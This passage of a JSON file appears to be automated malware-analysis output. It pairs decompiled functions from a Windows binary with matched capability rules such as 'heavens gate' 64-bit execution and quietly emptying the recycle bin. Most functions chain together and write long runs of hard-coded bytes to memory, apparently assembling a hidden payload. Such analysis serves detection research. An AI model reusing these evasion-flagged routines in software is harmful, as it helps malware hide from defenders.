0x1f;\n    *0x445a86 = 0x70;\n    *0x445a87 = 0xfb;\n    *0x4466a9 = 0x71;\n    *0x4466aa = 0;\n    *0x4466ab = 0xb2;\n    *0x4466ac = 0xbe;\n    *0x4466ad = 0xbe;\n    *0x4466ae = 0x77;\n    *0x4466af = 0xb8;\n    *0x4466b0 = 0x6f;\n    *0x4466b1 = 0x24;\n    *0x4466b2 = 0x71;\n    *0x4466b3 = 0x3e;\n    *0x4466b4 = 0xc1;\n    *0x4466b5 = 0x90;\n    *0x4466b6 = 0x51;\n    *0x4466b7 = 0xc3;\n    *0x4466b8 = 0x37;\n    *0x4466b9 = 0xb6;\n    *0x4466ba = 0x5f;\n    *0x4466bb = 0xcd;\n    *0x4466bc = 0x7d;\n    *0x4466bd = 0x8c;\n    *0x4466be = 0x46;\n    *0x4466bf = 100;\n    *0x4466c0 = 0xe0;\n    *0x4466c1 = 0xcc;\n    *0x4466c2 = 0x97;\n    *0x4466c3 = 0x94;\n    *0x4466c4 = 0xd1;\n    *0x4466c5 = 0x76;\n    *0x4466c6 = 0x44;\n    *0x4466c7 = 0xef;\n    *0x4466c8 = 0x66;\n    *0x4466c9 = 0x4d;\n    *0x4466ca = 0x25;\n    *0x4466cb = 8;\n    *0x4466cc = 0xd9;\n    *0x4466cd = 0x55;\n    *0x4466ce = 0x77;\n    *0x4466cf = 0xf9;\n    *0x4466d0 = 7;\n    *0x4466d1 = 0x5b;\n    *0x4466d2 = 0x58;\n    *0x4466d3 = 0xde;\n    *0x4466d4 = 0xf2;\n    *0x4466d5 = 0x6d;\n    *0x4466d6 = 0x4c;\n    *0x4466d7 = 0x58;\n    return param_1 + iVar1 + 0x12e517;\n}\n",
        "token_count": 1324
    },
    "0040d670": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040d670(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040d3d0(param_1);\n    *0x445b15 = 0xa3;\n    *0x445b16 = 0x8a;\n    *0x445b17 = 0xff;\n    *0x445b18 = 0x97;\n    *0x445b19 = 0xdc;\n    *0x445b1a = 6;\n    *0x445b1b = 0x88;\n    *0x445b1c = 0x21;\n    *0x445b1d = 0x4e;\n    *0x445b1e = 0x42;\n    *0x445b1f = 0xe2;\n    *0x445b20 = 0x4e;\n    *0x445b21 = 0xff;\n    *0x445b22 = 0x80;\n    *0x445b23 = 0x4e;\n    *0x445b24 = 0x68;\n    *0x445b25 = 0x8a;\n    *0x445b26 = 0x33;\n    *0x445b27 = 0xe2;\n    *0x445b28 = 0x2c;\n    *0x445b29 = 0x9e;\n    *0x445b2a = 0x83;\n    *0x445b2b = 6;\n    *0x445b2c = 0x4d;\n    *0x445b2d = 0x7f;\n    *0x445b2e = 0xcd;\n    *0x445b2f = 0xf8;\n    *0x445b30 = 0xf2;\n    *0x445b31 = 0x84;\n    *0x445b32 = 0x20;\n    *0x445b33 = 0x48;\n    *0x445b34 = 0x34;\n    *0x445b35 = 0x98;\n    *0x445b36 = 0xc2;\n    *0x445b37 = 0x5d;\n    *0x445b38 = 0xa0;\n    *0x445b39 = 0xba;\n    *0x445b3a = 0xa9;\n    *0x445b3b = 0xef;\n    *0x445b3c = 0xbb;\n    *0x445b3d = 0x7d;\n    *0x445b3e = 2;\n    *0x445b3f = 0x8b;\n    *0x445b40 = 0x79;\n    *0x445b41 = 0x88;\n    *0x445b42 = 0xad;\n    *0x445b43 = 0x12;\n    *0x446765 = 0xce;\n    *0x446766 = 0x50;\n    *0x446767 = 0x22;\n    *0x446768 = 0x4c;\n    *0x446769 = 0x4e;\n    *0x44676a = 0x6a;\n    *0x44676b = 0x7e;\n    *0x44676c = 0x55;\n    *0x44676d = 0xd9;\n    *0x44676e = 0x96;\n    *0x44676f = 0x5a;\n    *0x446770 = 9;\n    *0x446771 = 0xdb;\n    *0x446772 = 0x92;\n    *0x446773 = 0x73;\n    *0x446774 = 0xc;\n    *0x446775 = 2;\n    *0x446776 = 0x82;\n    *0x446777 = 10;\n    *0x446778 = 0xa2;\n    *0x446779 = 0xc1;\n    *0x44677a = 0x6e;\n    *0x44677b = 100;\n    *0x44677c = 0x35;\n    *0x44677d = 0xcd;\n    *0x44677e = 0xc2;\n    *0x44677f = 0x48;\n    *0x446780 = 0xd3;\n    *0x446781 = 0xa3;\n    *0x446782 = 0xcd;\n    *0x446783 = 0x84;\n    *0x446784 = 0xad;\n    *0x446785 = 0xff;\n    *0x446786 = 0x42;\n    *0x446787 = 0x68;\n    *0x446788 = 0x9a;\n    *0x446789 = 0x66;\n    *0x44678a = 0xba;\n    *0x44678b = 0x49;\n    *0x44678c = 0x91;\n    *0x44678d = 0x9e;\n    *0x44678e = 0x2f;\n    *0x44678f = 0;\n    *0x446790 = 0x33;\n    *0x446791 = 0x31;\n    *0x446792 = 0x82;\n    *0x446793 = 0x69;\n    return param_1 + iVar1 + 0x159d61;\n}\n",
        "token_count": 1261
    },
    "0040dea0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040dea0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040dc00(param_1);\n    *0x445ba2 = 0x1d;\n    *0x445ba3 = 0x81;\n    *0x445ba4 = 0x1a;\n    *0x445ba5 = 0xf8;\n    *0x445ba6 = 0x7b;\n    *0x445ba7 = 0x14;\n    *0x445ba8 = 0xdb;\n    *0x445ba9 = 0xee;\n    *0x445baa = 0xba;\n    *0x445bab = 0x9c;\n    *0x445bac = 0x7d;\n    *0x445bad = 0x55;\n    *0x445bae = 0xb6;\n    *0x445baf = 0xd5;\n    *0x445bb0 = 0xa6;\n    *0x445bb1 = 3;\n    *0x445bb2 = 1;\n    *0x445bb3 = 0xd2;\n    *0x445bb4 = 0xf0;\n    *0x445bb5 = 0x65;\n    *0x445bb6 = 0x5c;\n    *0x445bb7 = 0x76;\n    *0x445bb8 = 0x6a;\n    *0x445bb9 = 0xf8;\n    *0x445bba = 0x42;\n    *0x445bbb = 0xfb;\n    *0x445bbc = 0x15;\n    *0x445bbd = 0xd1;\n    *0x445bbe = 0x5e;\n    *0x445bbf = 0x6f;\n    *0x445bc0 = 0x68;\n    *0x445bc1 = 0x15;\n    *0x445bc2 = 0x10;\n    *0x445bc3 = 0x32;\n    *0x445bc4 = 0xcc;\n    *0x445bc5 = 0x82;\n    *0x445bc6 = 0xec;\n    *0x445bc7 = 0x79;\n    *0x445bc8 = 0x20;\n    *0x445bc9 = 0xe4;\n    *0x445bca = 0x3b;\n    *0x445bcb = 0xce;\n    *0x445bcc = 0x36;\n    *0x445bcd = 0xa0;\n    *0x445bce = 0x78;\n    *0x445bcf = 0x8d;\n    *0x445bd0 = 0x54;\n    *0x4467f2 = 0x9d;\n    *0x4467f3 = 0xde;\n    *0x4467f4 = 0x18;\n    *0x4467f5 = 0xfc;\n    *0x4467f6 = 0xd;\n    *0x4467f7 = 0xf7;\n    *0x4467f8 = 0x39;\n    *0x4467f9 = 0x95;\n    *0x4467fa = 0xae;\n    *0x4467fb = 0xa5;\n    *0x4467fc = 0xca;\n    *0x4467fd = 0x91;\n    *0x4467fe = 0x69;\n    *0x4467ff = 0x33;\n    *0x446800 = 0x5a;\n    *0x446801 = 0xe9;\n    *0x446802 = 0x10;\n    *0x446803 = 0xec;\n    *0x446804 = 0x9a;\n    *0x446805 = 0xdd;\n    *0x446806 = 0xd6;\n    *0x446807 = 0xa1;\n    *0x446808 = 0xe1;\n    *0x446809 = 0x6f;\n    *0x44680a = 0xd1;\n    *0x44680b = 0x27;\n    *0x44680c = 0xa7;\n    *0x44680d = 0xe6;\n    *0x44680e = 0x7f;\n    *0x44680f = 0xd7;\n    *0x446810 = 10;\n    *0x446811 = 0x4c;\n    *0x446812 = 0x3e;\n    *0x446813 = 0xd;\n    *0x446814 = 0x4c;\n    *0x446815 = 0xef;\n    *0x446816 = 0xd3;\n    *0x446817 = 0xa9;\n    *0x446818 = 0x53;\n    *0x446819 = 0xe4;\n    *0x44681a = 0xe4;\n    *0x44681b = 0x91;\n    *0x44681c = 0x28;\n    *0x44681d = 0x7f;\n    *0x44681e = 0x7e;\n    *0x44681f = 0x2d;\n    *0x446820 = 0x78;\n    return param_1 + iVar1 + 0x1675a4;\n}\n",
        "token_count": 1261
    },
    "0040e3e0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040e3e0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040e140(param_1);\n    *0x445c00 = 0x6f;\n    *0x445c01 = 0x68;\n    *0x445c02 = 0xa9;\n    *0x445c03 = 0xe5;\n    *0x445c04 = 0xf;\n    *0x445c05 = 0x73;\n    *0x445c06 = 0x9a;\n    *0x445c07 = 0x6c;\n    *0x445c08 = 0x22;\n    *0x445c09 = 6;\n    *0x445c0a = 0x20;\n    *0x445c0b = 0x33;\n    *0x445c0c = 0xb8;\n    *0x445c0d = 0xc5;\n    *0x445c0e = 0xf7;\n    *0x445c0f = 0xd6;\n    *0x445c10 = 0x59;\n    *0x445c11 = 0x67;\n    *0x445c12 = 0x8e;\n    *0x445c13 = 0x47;\n    *0x445c14 = 0x7d;\n    *0x445c15 = 0x37;\n    *0x445c16 = 0x8a;\n    *0x445c17 = 0x4b;\n    *0x445c18 = 0x14;\n    *0x445c19 = 0x93;\n    *0x445c1a = 0x42;\n    *0x445c1b = 0xfb;\n    *0x445c1c = 0;\n    *0x445c1d = 0x70;\n    *0x445c1e = 0x44;\n    *0x445c1f = 0x44;\n    *0x445c20 = 0x96;\n    *0x445c21 = 0xd4;\n    *0x445c22 = 0xcf;\n    *0x445c23 = 0x68;\n    *0x445c24 = 0x21;\n    *0x445c25 = 0x5a;\n    *0x445c26 = 0x57;\n    *0x445c27 = 0x7b;\n    *0x445c28 = 0x5e;\n    *0x445c29 = 0xb2;\n    *0x445c2a = 5;\n    *0x445c2b = 0xe6;\n    *0x445c2c = 1;\n    *0x445c2d = 0x1e;\n    *0x445c2e = 0x34;\n    *0x446850 = 0x47;\n    *0x446851 = 0x37;\n    *0x446852 = 0x66;\n    *0x446853 = 0x74;\n    *0x446854 = 0x15;\n    *0x446855 = 0x3e;\n    *0x446856 = 0xfa;\n    *0x446857 = 0x91;\n    *0x446858 = 0x20;\n    *0x446859 = 0xe0;\n    *0x44685a = 0xa6;\n    *0x44685b = 100;\n    *0x44685c = 0xb4;\n    *0x44685d = 0xb3;\n    *0x44685e = 0xb3;\n    *0x44685f = 0x94;\n    *0x446860 = 0xbe;\n    *0x446861 = 0x12;\n    *0x446862 = 0x53;\n    *0x446863 = 0xcf;\n    *0x446864 = 0x4f;\n    *0x446865 = 0x9b;\n    *0x446866 = 0x19;\n    *0x446867 = 0x45;\n    *0x446868 = 0x1d;\n    *0x446869 = 0xb1;\n    *0x44686a = 0x7c;\n    *0x44686b = 0x2b;\n    *0x44686c = 1;\n    *0x44686d = 0xfb;\n    *0x44686e = 0x58;\n    *0x44686f = 0x3a;\n    *0x446870 = 0x7a;\n    *0x446871 = 0xe4;\n    *0x446872 = 0x6c;\n    *0x446873 = 0x2e;\n    *0x446874 = 0x29;\n    *0x446875 = 0x19;\n    *0x446876 = 0xdd;\n    *0x446877 = 0x47;\n    *0x446878 = 0x53;\n    *0x446879 = 0xd;\n    *0x44687a = 0xb1;\n    *0x44687b = 0xcb;\n    *0x44687c = 99;\n    *0x44687d = 0x78;\n    *0x44687e = 0x55;\n    return param_1 + iVar1 + 0x14d0aa;\n}\n",
        "token_count": 1268
    },
    "0040e940": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040e940(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040e690(param_1);\n    *0x445c5e = 0x21;\n    *0x445c5f = 0xdd;\n    *0x445c60 = 0x6c;\n    *0x445c61 = 0x72;\n    *0x445c62 = 0xf;\n    *0x445c63 = 0xff;\n    *0x445c64 = 99;\n    *0x445c65 = 0x47;\n    *0x445c66 = 0xdd;\n    *0x445c67 = 1;\n    *0x445c68 = 0x8f;\n    *0x445c69 = 0x7f;\n    *0x445c6a = 0xf2;\n    *0x445c6b = 0x8f;\n    *0x445c6c = 0xe2;\n    *0x445c6d = 0x9f;\n    *0x445c6e = 0xea;\n    *0x445c6f = 0x24;\n    *0x445c70 = 0xc2;\n    *0x445c71 = 0x3c;\n    *0x445c72 = 0x16;\n    *0x445c73 = 0x91;\n    *0x445c74 = 0x89;\n    *0x445c75 = 0x81;\n    *0x445c76 = 0xfa;\n    *0x445c77 = 0x7d;\n    *0x445c78 = 6;\n    *0x445c79 = 0xaf;\n    *0x445c7a = 0xce;\n    *0x445c7b = 0xe0;\n    *0x445c7c = 0xfa;\n    *0x445c7d = 0x98;\n    *0x445c7e = 0xfe;\n    *0x445c7f = 0x87;\n    *0x445c80 = 0x9b;\n    *0x445c81 = 0x23;\n    *0x445c82 = 0xa9;\n    *0x445c83 = 0x93;\n    *0x445c84 = 0x15;\n    *0x445c85 = 0xcc;\n    *0x445c86 = 0x26;\n    *0x445c87 = 0xfa;\n    *0x445c88 = 4;\n    *0x445c89 = 0x21;\n    *0x445c8a = 0x7a;\n    *0x445c8b = 4;\n    *0x445c8c = 0xfb;\n    *0x4468ae = 0x73;\n    *0x4468af = 0xb0;\n    *0x4468b0 = 0x49;\n    *0x4468b1 = 0xec;\n    *0x4468b2 = 0x9d;\n    *0x4468b3 = 0xeb;\n    *0x4468b4 = 0xf3;\n    *0x4468b5 = 0x75;\n    *0x4468b6 = 0x7e;\n    *0x4468b7 = 0x75;\n    *0x4468b8 = 0x92;\n    *0x4468b9 = 7;\n    *0x4468ba = 0x5c;\n    *0x4468bb = 0xd3;\n    *0x4468bc = 0xd1;\n    *0x4468bd = 0x9a;\n    *0x4468be = 0xe4;\n    *0x4468bf = 0xe;\n    *0x4468c0 = 0xfc;\n    *0x4468c1 = 0xe7;\n    *0x4468c2 = 0xa5;\n    *0x4468c3 = 0x33;\n    *0x4468c4 = 0x85;\n    *0x4468c5 = 0xed;\n    *0x4468c6 = 0x93;\n    *0x4468c7 = 0xd2;\n    *0x4468c8 = 0x83;\n    *0x4468c9 = 0x70;\n    *0x4468ca = 0x84;\n    *0x4468cb = 0x80;\n    *0x4468cc = 0x2e;\n    *0x4468cd = 0x75;\n    *0x4468ce = 0xb6;\n    *0x4468cf = 0x55;\n    *0x4468d0 = 0x65;\n    *0x4468d1 = 200;\n    *0x4468d2 = 0x48;\n    *0x4468d3 = 0x6f;\n    *0x4468d4 = 0x28;\n    *0x4468d5 = 0x76;\n    *0x4468d6 = 0xbc;\n    *0x4468d7 = 0x6d;\n    *0x4468d8 = 0x1e;\n    *0x4468d9 = 0x53;\n    *0x4468da = 0x7c;\n    *0x4468db = 0xf4;\n    *0x4468dc = 0x10;\n    return param_1 + iVar1 + 0x14978a;\n}\n",
        "token_count": 1313
    },
    "0040ee90": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040ee90(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040ebe0(param_1);\n    *0x445cbc = 0xc6;\n    *0x445cbd = 0x55;\n    *0x445cbe = 0xd2;\n    *0x445cbf = 0xd3;\n    *0x445cc0 = 0xc1;\n    *0x445cc1 = 0x8d;\n    *0x445cc2 = 0x11;\n    *0x445cc3 = 0x8e;\n    *0x445cc4 = 0xd7;\n    *0x445cc5 = 0x34;\n    *0x445cc6 = 3;\n    *0x445cc7 = 0x94;\n    *0x445cc8 = 0xe4;\n    *0x445cc9 = 0x1a;\n    *0x445cca = 0xef;\n    *0x445ccb = 0x70;\n    *0x445ccc = 0xbc;\n    *0x445ccd = 0xa1;\n    *0x445cce = 0x51;\n    *0x445ccf = 0x7f;\n    *0x445cd0 = 0xa3;\n    *0x445cd1 = 0x42;\n    *0x445cd2 = 0x5a;\n    *0x445cd3 = 0x71;\n    *0x445cd4 = 0xd5;\n    *0x445cd5 = 6;\n    *0x445cd6 = 0x6e;\n    *0x445cd7 = 0xcd;\n    *0x445cd8 = 0xff;\n    *0x445cd9 = 0xd;\n    *0x445cda = 0xa5;\n    *0x445cdb = 0x6a;\n    *0x445cdc = 0xc3;\n    *0x445cdd = 10;\n    *0x445cde = 0x4a;\n    *0x445cdf = 0xf7;\n    *0x445ce0 = 0x38;\n    *0x445ce1 = 0xc4;\n    *0x445ce2 = 0x5f;\n    *0x445ce3 = 0x74;\n    *0x445ce4 = 0x68;\n    *0x445ce5 = 0x97;\n    *0x445ce6 = 0x17;\n    *0x445ce7 = 0xb6;\n    *0x445ce8 = 0xd1;\n    *0x445ce9 = 0xf1;\n    *0x445cea = 0x5b;\n    *0x44690c = 0xdd;\n    *0x44690d = 0xe2;\n    *0x44690e = 0xeb;\n    *0x44690f = 0xb1;\n    *0x446910 = 0x45;\n    *0x446911 = 0x6e;\n    *0x446912 = 2;\n    *0x446913 = 1;\n    *0x446914 = 0x73;\n    *0x446915 = 0x60;\n    *0x446916 = 0x57;\n    *0x446917 = 0x60;\n    *0x446918 = 0x4e;\n    *0x446919 = 0xcb;\n    *0x44691a = 0x91;\n    *0x44691b = 0xb2;\n    *0x44691c = 0xdf;\n    *0x44691d = 4;\n    *0x44691e = 0xbb;\n    *0x44691f = 0x60;\n    *0x446920 = 0xd4;\n    *0x446921 = 0x28;\n    *0x446922 = 0xc5;\n    *0x446923 = 0xd7;\n    *0x446924 = 0xfe;\n    *0x446925 = 0x94;\n    *0x446926 = 2;\n    *0x446927 = 7;\n    *0x446928 = 0xd4;\n    *0x446929 = 0x6b;\n    *0x44692a = 0xab;\n    *0x44692b = 0xe4;\n    *0x44692c = 0xed;\n    *0x44692d = 0x13;\n    *0x44692e = 0x5b;\n    *0x44692f = 0xe8;\n    *0x446930 = 0x89;\n    *0x446931 = 0xb8;\n    *0x446932 = 0x92;\n    *0x446933 = 0x90;\n    *0x446934 = 9;\n    *0x446935 = 200;\n    *0x446936 = 0x33;\n    *0x446937 = 0xdb;\n    *0x446938 = 0x73;\n    *0x446939 = 0x76;\n    *0x44693a = 5;\n    return param_1 + iVar1 + 0x153302;\n}\n",
        "token_count": 1218
    },
    "0040f690": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040f690(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f3e0(param_1);\n    *0x445d49 = 0xe3;\n    *0x445d4a = 0x67;\n    *0x445d4b = 0x4f;\n    *0x445d4c = 0x7c;\n    *0x445d4d = 0x90;\n    *0x445d4e = 0x1c;\n    *0x445d4f = 0x45;\n    *0x445d50 = 0x89;\n    *0x445d51 = 0x7a;\n    *0x445d52 = 0xbb;\n    *0x445d53 = 0x84;\n    *0x445d54 = 99;\n    *0x445d55 = 0x2b;\n    *0x445d56 = 0x2a;\n    *0x445d57 = 0xf;\n    *0x445d58 = 0x39;\n    *0x445d59 = 0x44;\n    *0x445d5a = 0xff;\n    *0x445d5b = 0x40;\n    *0x445d5c = 0x2e;\n    *0x445d5d = 0xf7;\n    *0x445d5e = 7;\n    *0x445d5f = 0x44;\n    *0x445d60 = 0xd8;\n    *0x445d61 = 0x8b;\n    *0x445d62 = 0xc3;\n    *0x445d63 = 0x9d;\n    *0x445d64 = 0xc0;\n    *0x445d65 = 0xdb;\n    *0x445d66 = 0xe5;\n    *0x445d67 = 0x9f;\n    *0x445d68 = 0xe6;\n    *0x445d69 = 0xd7;\n    *0x445d6a = 0xd8;\n    *0x445d6b = 0xf3;\n    *0x445d6c = 0x3a;\n    *0x445d6d = 2;\n    *0x445d6e = 0x35;\n    *0x445d6f = 0x17;\n    *0x445d70 = 0x23;\n    *0x445d71 = 0xf2;\n    *0x445d72 = 0x4f;\n    *0x445d73 = 0xdc;\n    *0x445d74 = 0xfb;\n    *0x445d75 = 0xd3;\n    *0x445d76 = 0xa8;\n    *0x445d77 = 0xe7;\n    *0x446999 = 0x34;\n    *0x44699a = 0xd;\n    *0x44699b = 0x18;\n    *0x44699c = 0xc1;\n    *0x44699d = 0x7d;\n    *0x44699e = 0xbf;\n    *0x44699f = 0x90;\n    *0x4469a0 = 200;\n    *0x4469a1 = 0x43;\n    *0x4469a2 = 0x85;\n    *0x4469a3 = 0xa3;\n    *0x4469a4 = 0x78;\n    *0x4469a5 = 0x67;\n    *0x4469a6 = 0x33;\n    *0x4469a7 = 0xc4;\n    *0x4469a8 = 200;\n    *0x4469a9 = 0x89;\n    *0x4469aa = 0x80;\n    *0x4469ab = 0x67;\n    *0x4469ac = 0xd0;\n    *0x4469ad = 0x90;\n    *0x4469ae = 0x88;\n    *0x4469af = 0x85;\n    *0x4469b0 = 0x4e;\n    *0x4469b1 = 0x28;\n    *0x4469b2 = 0x4b;\n    *0x4469b3 = 0x19;\n    *0x4469b4 = 0x24;\n    *0x4469b5 = 0x3f;\n    *0x4469b6 = 0x2c;\n    *0x4469b7 = 0xa5;\n    *0x4469b8 = 0xd8;\n    *0x4469b9 = 0x88;\n    *0x4469ba = 0x73;\n    *0x4469bb = 0xae;\n    *0x4469bc = 0x12;\n    *0x4469bd = 0xf9;\n    *0x4469be = 0xcb;\n    *0x4469bf = 0x3b;\n    *0x4469c0 = 0x22;\n    *0x4469c1 = 0x4c;\n    *0x4469c2 = 0xc4;\n    *0x4469c3 = 0x5a;\n    *0x4469c4 = 0x78;\n    *0x4469c5 = 0x81;\n    *0x4469c6 = 0x52;\n    *0x4469c7 = 0x9b;\n    return param_1 + iVar1 + 0x152922;\n}\n",
        "token_count": 1328
    },
    "0040f940": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040f940(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f690(param_1);\n    *0x445d78 = 0x91;\n    *0x445d79 = 0xe4;\n    *0x445d7a = 0x79;\n    *0x445d7b = 0x31;\n    *0x445d7c = 0xa6;\n    *0x445d7d = 0xf8;\n    *0x445d7e = 0x2e;\n    *0x445d7f = 0x87;\n    *0x445d80 = 0x71;\n    *0x445d81 = 0xf7;\n    *0x445d82 = 0xe7;\n    *0x445d83 = 0xb;\n    *0x445d84 = 0x1c;\n    *0x445d85 = 0x5a;\n    *0x445d86 = 0xf8;\n    *0x445d87 = 0xb1;\n    *0x445d88 = 0x44;\n    *0x445d89 = 0xb3;\n    *0x445d8a = 0x6a;\n    *0x445d8b = 0xc2;\n    *0x445d8c = 0x7c;\n    *0x445d8d = 0x23;\n    *0x445d8e = 0x78;\n    *0x445d8f = 0x5c;\n    *0x445d90 = 0xcb;\n    *0x445d91 = 0xe1;\n    *0x445d92 = 0x13;\n    *0x445d93 = 0xf0;\n    *0x445d94 = 0x29;\n    *0x445d95 = 0xba;\n    *0x445d96 = 0x5f;\n    *0x445d97 = 0xc3;\n    *0x445d98 = 6;\n    *0x445d99 = 0x8b;\n    *0x445d9a = 0x34;\n    *0x445d9b = 0x6e;\n    *0x445d9c = 0xc4;\n    *0x445d9d = 0xc9;\n    *0x445d9e = 0x9d;\n    *0x445d9f = 0x5e;\n    *0x445da0 = 0x38;\n    *0x445da1 = 0xfa;\n    *0x445da2 = 0x5c;\n    *0x445da3 = 0x55;\n    *0x445da4 = 0x2c;\n    *0x445da5 = 0x39;\n    *0x445da6 = 100;\n    *0x4469c8 = 0x29;\n    *0x4469c9 = 0x5a;\n    *0x4469ca = 0x4c;\n    *0x4469cb = 0x94;\n    *0x4469cc = 0x71;\n    *0x4469cd = 0xdd;\n    *0x4469ce = 0xee;\n    *0x4469cf = 0x5b;\n    *0x4469d0 = 0x2c;\n    *0x4469d1 = 0xd6;\n    *0x4469d2 = 0x58;\n    *0x4469d3 = 0xf;\n    *0x4469d4 = 0x5b;\n    *0x4469d5 = 0x53;\n    *0x4469d6 = 0xd;\n    *0x4469d7 = 0x4f;\n    *0x4469d8 = 0xa5;\n    *0x4469d9 = 0x26;\n    *0x4469da = 0x75;\n    *0x4469db = 0xc1;\n    *0x4469dc = 0xd4;\n    *0x4469dd = 0x67;\n    *0x4469de = 0x5b;\n    *0x4469df = 0x8d;\n    *0x4469e0 = 0x54;\n    *0x4469e1 = 0xef;\n    *0x4469e2 = 0x6f;\n    *0x4469e3 = 0xdf;\n    *0x4469e4 = 0xb7;\n    *0x4469e5 = 0xdd;\n    *0x4469e6 = 0xc5;\n    *0x4469e7 = 0x69;\n    *0x4469e8 = 0x33;\n    *0x4469e9 = 0x15;\n    *0x4469ea = 0x54;\n    *0x4469eb = 0xde;\n    *0x4469ec = 0x22;\n    *0x4469ed = 0xbc;\n    *0x4469ee = 0x78;\n    *0x4469ef = 0x78;\n    *0x4469f0 = 0x82;\n    *0x4469f1 = 0xbe;\n    *0x4469f2 = 0x71;\n    *0x4469f3 = 0x73;\n    *0x4469f4 = 0x73;\n    *0x4469f5 = 0x48;\n    *0x4469f6 = 0xe2;\n    return param_1 + iVar1 + 0x167c0a;\n}\n",
        "token_count": 1333
    },
    "0040fbe0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nint32_t fcn.0040fbe0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040f940(param_1);\n    *0x445da7 = 0xe6;\n    *0x445da8 = 0xe0;\n    *0x445da9 = 0xb6;\n    *0x445daa = 0x5e;\n    *0x445dab = 0xfd;\n    *0x445dac = 0x84;\n    *0x445dad = 0x33;\n    *0x445dae = 0x25;\n    *0x445daf = 0x55;\n    *0x445db0 = 0xc0;\n    *0x445db1 = 0x88;\n    *0x445db2 = 0x49;\n    *0x445db3 = 0;\n    *0x445db4 = 0x2c;\n    *0x445db5 = 0x20;\n    *0x445db6 = 0x90;\n    *0x445db7 = 0xe2;\n    *0x445db8 = 0xd8;\n    *0x445db9 = 0x7a;\n    *0x445dba = 0x70;\n    *0x445dbb = 0x36;\n    *0x445dbc = 0xc6;\n    *0x445dbd = 0xa9;\n    *0x445dbe = 0x96;\n    *0x445dbf = 8;\n    *0x445dc0 = 0x6b;\n    *0x445dc1 = 0xd4;\n    *0x445dc2 = 99;\n    *0x445dc3 = 0xb9;\n    *0x445dc4 = 0x32;\n    *0x445dc5 = 0xb7;\n    *0x445dc6 = 0x69;\n    *0x445dc7 = 0x7f;\n    *0x445dc8 = 0xf9;\n    *0x445dc9 = 0x20;\n    *0x445dca = 0xf2;\n    *0x445dcb = 0xe2;\n    *0x445dcc = 0x91;\n    *0x445dcd = 0x72;\n    *0x445dce = 0x7a;\n    *0x445dcf = 0x40;\n    *0x445dd0 = 0x42;\n    *0x445dd1 = 0x26;\n    *0x445dd2 = 0x30;\n    *0x445dd3 = 0x4a;\n    *0x445dd4 = 0x45;\n    *0x445dd5 = 0x45;\n    *0x4469f7 = 0x90;\n    *0x4469f8 = 0xbb;\n    *0x4469f9 = 0x4f;\n    *0x4469fa = 0x53;\n    *0x4469fb = 0x93;\n    *0x4469fc = 0x45;\n    *0x4469fd = 7;\n    *0x4469fe = 0xaf;\n    *0x4469ff = 0xc5;\n    *0x446a00 = 0x9e;\n    *0x446a01 = 0x6c;\n    *0x446a02 = 0xc6;\n    *0x446a03 = 0x72;\n    *0x446a04 = 0x77;\n    *0x446a05 = 0xbc;\n    *0x446a06 = 0xcc;\n    *0x446a07 = 0x6c;\n    *0x446a08 = 0x26;\n    *0x446a09 = 0xfb;\n    *0x446a0a = 0xd8;\n    *0x446a0b = 0x87;\n    *0x446a0c = 0x24;\n    *0x446a0d = 0x6e;\n    *0x446a0e = 0x67;\n    *0x446a0f = 0x1b;\n    *0x446a10 = 0x90;\n    *0x446a11 = 0x20;\n    *0x446a12 = 0xd6;\n    *0x446a13 = 0x85;\n    *0x446a14 = 0xab;\n    *0x446a15 = 0x60;\n    *0x446a16 = 0xeb;\n    *0x446a17 = 0xa6;\n    *0x446a18 = 0x5a;\n    *0x446a19 = 0x41;\n    *0x446a1a = 0x4d;\n    *0x446a1b = 99;\n    *0x446a1c = 0xa7;\n    *0x446a1d = 0x19;\n    *0x446a1e = 7;\n    *0x446a1f = 0x23;\n    *0x446a20 = 0x40;\n    *0x446a21 = 3;\n    *0x446a22 = 10;\n    *0x446a23 = 0x54;\n    *0x446a24 = 0xf7;\n    *0x446a25 = 0x5d;\n    return param_1 + iVar1 + 0x156c10;\n}\n",
        "token_count": 1280
    },
    "0041dd16": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
